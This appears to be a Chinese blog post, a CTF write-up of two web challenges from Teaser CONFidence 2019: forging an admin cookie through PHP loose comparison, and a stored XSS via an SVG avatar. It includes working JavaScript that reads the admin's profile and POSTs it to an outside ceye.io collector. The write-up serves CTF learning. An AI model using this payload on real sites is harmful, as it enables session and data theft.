@@ -1,0 +1,361 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#202020">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+  
+  
+    <meta name="keywords" content="Web安全,">
+  
+
+  
+    <meta name="description" content="d2VsY29tZSB0byBteSBibG9n">
+  
+  
+  
+  <link rel="icon" type="image/x-icon" href="/1.jpg">
+  
+  <title>Teaser CONFidence CTF Web writeup [ Mi1k7ea ]</title>
+  
+    <!-- stylesheets list from config.yml -->
+    
+      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
+    
+      <link rel="stylesheet" href="/css/xoxo.css">
+    
+  
+</head>
+
+
+<body>
+  <div class="nav-container">
+    <nav class="home-menu pure-menu pure-menu-horizontal">
+  <a class="pure-menu-heading" href="/">
+    
+    <span class="title" style="text-transform:none">Mi1k7ea</span>
+  </a>
+
+  <ul class="pure-menu-list clearfix">
+      
+          
+            
+              <li class="pure-menu-item"><a href="/archives" class="pure-menu-link">归档</a></li>
+            
+          
+      
+          
+            
+              <li class="pure-menu-item"><a href="/about" class="pure-menu-link">关于</a></li>
+            
+          
+      
+  </ul>
+   
+</nav>
+
+  </div>
+
+  <div class="container" id="content-outer">
+    <div class="inner" id="content-inner">
+      <div class="post-container">
+  <article class="post" id="post">
+    <header class="post-header text-center">
+      <h1 class="title">
+        Teaser CONFidence CTF Web writeup
+      </h1>
+      <span>
+        
+        <time class="time" datetime="2019-03-21T11:58:22.000Z">
+        2019-03-21
+      </time>
+        
+      </span>
+      <span class="slash">/</span>
+      <span class="post-meta">
+      <span class="post-tags">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li></ul>
+      </span>
+    </span>
+      <!--<span class="slash">/</span>
+      <span class="read">
+      <span id="busuanzi_value_page_pv"></span> 点击
+    </span>
+      <span class="slash">/</span>-->
+    </header>
+
+    <div class="post-content">
+      <p>这次Web题只做了前两道，最后一道GO的题目不会就没做了。</p>
+<h2 id="My-admin-panel"><a href="#My-admin-panel" class="headerlink" title="My admin panel"></a>My admin panel</h2><p>题目地址：<a href="http://gameserver.zajebistyc.tf/" target="_blank" rel="noopener">http://gameserver.zajebistyc.tf/</a></p>
+<p>题目描述：I think I’ve found something interesting, but I’m not really a PHP expert. Do you think it’s exploitable?</p>
+<p>访问该页面，是个登录界面，可以下载客户端包：</p>
+<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/1.png" alt=""></p>
+<p>下载该包下来，解压打开看，发现全是C/C++代码，和本题提示的PHP无关，因此点一个不在这。</p>
+<p>尝试随便输入登录，发现无论输入啥都是返回Done界面：</p>
+<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/2.png" alt=""></p>
+<p>这样的话也没办法进行SQL注入和盲注了，因为无论输入什么内容返回内容都一样。</p>
+<p>那就尝试用工具扫下Web站点下隐藏的页面，果不其然：</p>
+<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/3.png" alt=""></p>
+<p>一个个访问，login.php返回”Not authenticated.”，其他文件无显示，访问admin目录，存在一个login.php.bak备份文件：</p>
+<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/4.png" alt=""></p>
+<p>下载下来，代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'../func.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'../config.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$_COOKIE[<span class="string">'otadmin'</span>]) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">"Not authenticated.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/^&#123;"hash": [0-9A-Z\"]+&#125;$/'</span>, $_COOKIE[<span class="string">'otadmin'</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"COOKIE TAMPERING xD IM A SECURITY EXPERT\n"</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$session_data = json_decode($_COOKIE[<span class="string">'otadmin'</span>], <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($session_data === <span class="keyword">NULL</span>) &#123; <span class="keyword">echo</span> <span class="string">"COOKIE TAMPERING xD IM A SECURITY EXPERT\n"</span>; <span class="keyword">exit</span>(); &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($session_data[<span class="string">'hash'</span>] != strtoupper(MD5($cfg_pass))) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"I CAN EVEN GIVE YOU A HINT XD \n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; i &lt; strlen(MD5(<span class="string">'xDdddddd'</span>)); i++) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(ord(MD5($cfg_pass)[$i]) &amp; <span class="number">0xC0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">display_admin();</span><br></pre></td></tr></table></figure>
+<p>分析一下，先判断cookie字段是否存在otadmin属性；然后正则判断otadmin是否满足指定json格式的内容；提取出hash键值和$cfg_pass变量的MD5值进行比较，当不相等时输出一段经过运算后的提示信息。</p>
+<p>注意，<code>if ($session_data[&#39;hash&#39;] != strtoupper(MD5($cfg_pass))) {</code>这里用的比较符是!=，按照习惯会想到是PHP弱类型。</p>
+<p>随便填otadmin的内容发过去/admin/login.php看看，注意cookie值的构造要满足前面正则的匹配：</p>
+<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/5.png" alt=""></p>
+<p>这里返回了一串经过运算处理后的内容：</p>
+<p>0006464640640064000646464640006400640640646400</p>
+<p>分析一下，只有0/6/4这几个数字。将运算的那段代码扣下来本地运行一下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cfg_pass=<span class="string">"Hello666"</span>;</span><br><span class="line"><span class="keyword">echo</span> MD5($cfg_pass);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen(MD5(<span class="string">'xDdddddd'</span>)); $i++) &#123;</span><br><span class="line">	<span class="comment">// echo(ord(MD5($cfg_pass)[$i]) &amp; 0xC0);</span></span><br><span class="line">	<span class="keyword">echo</span> MD5($cfg_pass)[$i];</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> ord(MD5($cfg_pass)[$i]);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span>(ord(MD5($cfg_pass)[$i]) &amp; <span class="number">0xC0</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;-------------&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>随便给$cfg_pass变量赋值，然后运行观察，MD5值没啥好说的，到for循环后，先输出MD5的每一位，然后对其调用ord()函数取该字符对于的ASCII码，最后再和0xC0进行&amp;与运算：</p>
+<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/6.png" alt=""></p>
+<p>可以看到，最后&amp;与运算的结果不是0就是64，那就写个小脚本确认一下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">127</span>):</span><br><span class="line">	print(str(x)+<span class="string">":"</span>+str(x&amp;<span class="number">0xC0</span>))</span><br></pre></td></tr></table></figure>
+<p>运行这段代码会发现，1-63与运算后为0，64以后与运算后为64。我们知道，数字0-9的ASCII码为48-57，即数字与运算后结果均为0，而字母A-Za-z的ASCII码都大于64，即字母与运算后结果均为64。</p>
+<p>那么就很明确了，再看看页面返回的值：</p>
+<p>0006464640640064000646464640006400640640646400</p>
+<p>前面3位是0，后面接着是字母结合数字的混合体。</p>
+<p>这时就可以祭出弱类型了，我们知道<code>123==&quot;123aivmfsjoo90i1jj90i0i031&quot;</code>是恒成立的，因此剩下的问题就变成了只需要暴破该MD5的前3为数字即可绕过得到flag，最终爆破出的payload为<code>Cookie: otadmin={&quot;hash&quot;: 389}</code>：</p>
+<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/7.png" alt=""></p>
+<h2 id="Web-50"><a href="#Web-50" class="headerlink" title="Web 50"></a>Web 50</h2><p>题目地址：<a href="http://web50.zajebistyc.tf/login?next=%2F" target="_blank" rel="noopener">http://web50.zajebistyc.tf/login?next=%2F</a></p>
+<p>题目描述：idk what this site does, but you can put some secret, shoe size and report it to the admin…</p>
+<p>访问页面，是个登录界面：</p>
+<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/8.png" alt=""></p>
+<p>随便输入用户名和密码，进入了另一个界面：</p>
+<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/9.png" alt=""></p>
+<p>其中有两个链接，Profile为当前登录用户的信息设置界面，包括设置一些字段内容和上传头像功能：</p>
+<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/10.png" alt=""></p>
+<p>另一个Report a bug为向管理员报告bug链接的地方，由此推测是一道通过XSS窃取管理员cookie获取flag的题目：</p>
+<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/11.png" alt=""></p>
+<p>回到用户信息设置界面，尝试将URL栏的本用户alan改为admin，可以访问，但是没有显示用户Avatar头像和Secret字段，猜测flag可能藏在Secret字段中：</p>
+<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/12.png" alt=""></p>
+<p>回到本用户设置界面随意设置，发现图片只能上传100*100格式的，且对文件的Content-Type、后缀名以及文件内容前面部分进行了校验，一开始想上传一句话木马的，发现没有文件包含结合便无法利用。</p>
+<p>后面想了一下应该就是注入XSS然后将用户链接发过去让admin访问。</p>
+<p>写段测试代码，注意要设置宽度和高度均为100：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" standalone="no"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">version</span>=<span class="string">"1.1"</span> <span class="attr">baseProfile</span>=<span class="string">"full"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"100"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">polygon</span> <span class="attr">id</span>=<span class="string">"triangle"</span> <span class="attr">points</span>=<span class="string">"0,0 0,50 50,0"</span> <span class="attr">fill</span>=<span class="string">"#009900"</span> <span class="attr">stroke</span>=<span class="string">"#004400"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">alert(<span class="string">"Mi1k7ea"</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>本地访问没问题：</p>
+<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/13.png" alt=""></p>
+<p>上传到Avatar：</p>
+<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/14.png" alt=""></p>
+<p>确认一下，访问该Avatar所在地址，没有问题，成功弹框：</p>
+<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/15.png" alt=""></p>
+<p>到report界面上报，说admin会查看，确认了就是通过XSS获取admin的敏感信息来获得flag：</p>
+<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/16.png" alt=""></p>
+<p>后面就修改一下JS代码，让admin访问自己的profile界面，因为其本身拥有对Secret字段的访问权，然后再通过JS实现XMLHttpRequest以POST形式发送过来，这样就可以得到它的Secret字段内容了：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" standalone="no"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">version</span>=<span class="string">"1.1"</span> <span class="attr">baseProfile</span>=<span class="string">"full"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"100"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">polygon</span> <span class="attr">id</span>=<span class="string">"triangle"</span> <span class="attr">points</span>=<span class="string">"0,0 0,50 50,0"</span> <span class="attr">fill</span>=<span class="string">"#009900"</span> <span class="attr">stroke</span>=<span class="string">"#004400"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="actionscript">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">	<span class="keyword">if</span> (xhr.readyState === <span class="number">4</span>) &#123;</span></span><br><span class="line"><span class="actionscript">		<span class="keyword">var</span> xhr2 = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="actionscript">		xhr2.open(<span class="string">"POST"</span>, <span class="string">"http://XXXX.ceye.io/"</span>);</span></span><br><span class="line"><span class="undefined">		xhr2.send(xhr.responseText);</span></span><br><span class="line"><span class="undefined">	&#125;</span></span><br><span class="line"><span class="undefined">&#125;   </span></span><br><span class="line"><span class="actionscript">xhr.open(<span class="string">"GET"</span>, <span class="string">"http://web50.zajebistyc.tf/profile/admin"</span>);</span></span><br><span class="line"><span class="actionscript">xhr.withCredentials = <span class="literal">true</span>;</span></span><br><span class="line"><span class="undefined">xhr.send();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>再次上传svg图像，将该Avatar地址上报给admin，然后到ceye中可收到flag：</p>
+<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/17.png" alt=""></p>
+
+    </div>
+
+  </article>
+  <div class="toc-container">
+    
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#My-admin-panel"><span class="toc-text">My admin panel</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-50"><span class="toc-text">Web 50</span></a></li></ol>
+  </div>
+
+
+  </div>
+</div>
+<div class="copyright">
+    <span>本作品采用</span>
+    <a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
+    <span>进行许可。 转载时请注明原文链接。</span>
+</div>
+
+
+  
+    <div class="post-nav">
+      <div class="post-nav-item post-nav-next">
+        
+          <span>〈 </span>
+          <a href="/2019/03/17/SpEL注入之javacon/" rel="next" title="SpEL注入之javacon">
+          SpEL注入之javacon
+          </a>
+        
+      </div>
+  
+      <div class="post-nav-item post-nav-prev">
+          
+          <a href="/2019/03/22/图片XSS小结/" rel="prev" title="图片XSS小结">
+            图片XSS小结
+          </a>
+          <span>〉</span>
+        
+      </div>
+    </div>
+  
+
+
+    </div>
+
+    
+    
+
+  </div>
+  <footer class="footer text-center">
+    <div id="bottom-inner">
+        <span>Copyright &copy; Mi1k7ea</span>  |  
+        <span id="busuanzi_container_site_pv">总访问量 <span id="busuanzi_value_site_pv"></span></span> | 
+        <span id="busuanzi_container_site_uv">访客 <span id="busuanzi_value_site_uv"></span></span>
+    </div>
+</footer>
+
+  
+
+<script>
+  (function(window, document, undefined) {
+
+    var timer = null;
+
+    function returnTop() {
+      cancelAnimationFrame(timer);
+      timer = requestAnimationFrame(function fn() {
+        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
+        if (oTop > 0) {
+          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
+          timer = requestAnimationFrame(fn);
+        } else {
+          cancelAnimationFrame(timer);
+        }
+      });
+    }
+
+    var hearts = [];
+    window.requestAnimationFrame = (function() {
+      return window.requestAnimationFrame ||
+        window.webkitRequestAnimationFrame ||
+        window.mozRequestAnimationFrame ||
+        window.oRequestAnimationFrame ||
+        window.msRequestAnimationFrame ||
+        function(callback) {
+          setTimeout(callback, 1000 / 60);
+        }
+    })();
+    init();
+
+    function init() {
+      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
+      attachEvent();
+      gameloop();
+      addMenuEvent();
+    }
+
+    function gameloop() {
+      for (var i = 0; i < hearts.length; i++) {
+        if (hearts[i].alpha <= 0) {
+          document.body.removeChild(hearts[i].el);
+          hearts.splice(i, 1);
+          continue;
+        }
+        hearts[i].y--;
+        hearts[i].scale += 0.004;
+        hearts[i].alpha -= 0.013;
+        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
+      }
+      requestAnimationFrame(gameloop);
+    }
+
+    /**
+     * 给logo设置点击事件
+     * 
+     * - 回到顶部
+     * - 出现爱心
+     */
+    function attachEvent() {
+      var old = typeof window.onclick === "function" && window.onclick;
+      var logo = document.getElementById("logo");
+      if (logo) {
+        logo.onclick = function(event) {
+          returnTop();
+          old && old();
+          createHeart(event);
+        }
+      }
+      
+    }
+
+    function createHeart(event) {
+      var d = document.createElement("div");
+      d.className = "heart";
+      hearts.push({
+        el: d,
+        x: event.clientX - 5,
+        y: event.clientY - 5,
+        scale: 1,
+        alpha: 1,
+        color: randomColor()
+      });
+      document.body.appendChild(d);
+    }
+
+    function css(css) {
+      var style = document.createElement("style");
+      style.type = "text/css";
+      try {
+        style.appendChild(document.createTextNode(css));
+      } catch (ex) {
+        style.styleSheet.cssText = css;
+      }
+      document.getElementsByTagName('head')[0].appendChild(style);
+    }
+
+    function randomColor() {
+      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
+      return "#F44336";
+    }
+
+    function addMenuEvent() {
+      var menu = document.getElementById('menu-main-post');
+      if (menu) {
+        var toc = document.getElementById('toc');
+        if (toc) {
+          menu.onclick = function() {
+            if (toc) {
+              if (toc.style.display == 'block') {
+                toc.style.display = 'none';
+              } else {
+                toc.style.display = 'block';
+              }
+            }
+          };
+        } else {
+          menu.style.display = 'none';
+        }
+      }
+    }
+
+  })(window, document);
+</script>
+
+  
+
+
+
+  
+<script>
+  (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+</body>
+</html>
